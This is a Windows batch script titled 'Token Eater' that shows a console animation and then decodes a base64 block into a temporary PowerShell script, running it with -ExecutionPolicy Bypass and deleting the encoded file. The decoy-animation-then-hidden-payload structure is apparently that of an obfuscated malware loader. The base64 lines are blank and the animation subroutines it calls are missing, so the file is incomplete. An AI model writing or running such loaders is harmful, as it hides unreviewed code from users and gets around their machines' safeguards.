@echo off
echo Add-Type -MemberDefinition '[DllImport("kernel32.dll")] public static extern IntPtr GetConsoleWindow();[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr h,int n);' -Name WM -Namespace WM -ErrorAction SilentlyContinue > "%TEMP%\fl_mx.ps1"
echo [WM.WM]::ShowWindow([WM.WM]::GetConsoleWindow(), 3) >> "%TEMP%\fl_mx.ps1"
powershell -NoProfile -ExecutionPolicy Bypass -File "%TEMP%\fl_mx.ps1" 2>nul
del "%TEMP%\fl_mx.ps1" 2>nul

for /f "delims=" %%a in ('echo prompt $E^| cmd') do set "ESC=%%a"

set "R=%ESC%[0m"
set "O=%ESC%[38;2;198;115;75m%ESC%[1m"
set "DIM=%ESC%[2m"

title Token Eater
  cls

for /f %%a in ('powershell -NoProfile -Command [Console]::WindowWidth') do set "COLS=%%a"
set /a "LPAD=(COLS-72)/2"
  if %LPAD% LSS 0 set "LPAD=0"
  set "PAD="
:PAD_BUILD
  if %LPAD% GTR 0 (
    set "PAD=%PAD% "
    set /a "LPAD-=1"
    goto PAD_BUILD
  )

set /a i=0
:SPIN_LOOP
  set /a i+=1
  set /a f=i %% 8
  if %f%==0 set f=8
  set "VTOP=2"
  if %f%==2 set "VTOP=3"
  if %f%==3 set "VTOP=5"
  if %f%==4 set "VTOP=7"
  if %f%==5 set "VTOP=7"
  if %f%==6 set "VTOP=5"
  if %f%==7 set "VTOP=3"
  cls
  for /l %%n in (1,1,%VTOP%) do echo.
  if %f%==1 call :BF_FRONT
  if %f%==2 call :BF_MID1
  if %f%==3 call :BF_SIDE
  if %f%==4 call :BF_MID2
  if %f%==5 call :BF_BACK
  if %f%==6 call :BF_MID2
  if %f%==7 call :BF_SIDE
  if %f%==8 call :BF_MID1
  echo.
  echo %PAD%%DIM%  spinning...%R%
  ping -n 1 -w 250 192.0.2.1 >nul
  if %i% lss 16 goto SPIN_LOOP

cls
  for /l %%n in (1,1,2) do echo.
  call :BF_FRONT
  echo.
  echo %PAD%%DIM%  ...%R%
  ping -n 1 -w 400 192.0.2.1 >nul

cls
  for /l %%n in (1,1,2) do echo.
  call :BF_FRONT
  echo.
  echo %PAD%%DIM%  .%R%
  ping -n 1 -w 650 192.0.2.1 >nul

cls
  for /l %%n in (1,1,2) do echo.
  call :BF_FRONT
  ping -n 1 -w 1000 192.0.2.1 >nul

cls
  for /l %%n in (1,1,2) do echo.
  call :BF_FRONT
  ping -n 2 -w 1000 192.0.2.1 >nul

set /a j=0
:CLICK_LOOP
  set /a j+=1
  set /a jm=j %% 2
  set "VTOP=3"
  if %jm%==0 set "VTOP=4"
  cls
  for /l %%n in (1,1,%VTOP%) do echo.
  if %jm%==1 (call :BF_LEGS_A) else (call :BF_LEGS_B)
  echo.
  echo %PAD%%DIM%  *click* *click*%R%
  ping -n 1 -w 250 192.0.2.1 >nul
  if %j% lss 8 goto CLICK_LOOP

for %%a in ("%TEMP%") do set "TMPD=%%~sa"
  set "B64TXT=%TMPD%\fl_b64.txt"
  set "PSX=%TMPD%\fl_ps.ps1"
(
echo 
echo 
echo 
echo 
echo 
echo 
echo 
echo 
echo 
echo 
echo 
echo 
echo 
echo 
echo 
echo 
echo 
echo 
echo 
echo 
echo 
echo 
echo 
echo 
echo 
echo 
echo 
echo 
echo 
echo 
echo 
echo 
echo 
echo 
echo 
echo 
echo 
echo 
echo 
echo 
echo 
) > "%B64TXT%"

powershell -NoProfile -ExecutionPolicy Bypass -Command "$b=(Get-Content %B64TXT%) -join ''; [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($b)) | Set-Content %PSX% -Encoding UTF8; Remove-Item %B64TXT% -Force"

if not exist "%PSX%" (
  echo [ERROR] PS decode failed
  pause
  exit /b 1
)

powershell -NoProfile -ExecutionPolicy Bypass -File %PSX% run

color 07
  cls
  exit /b 0

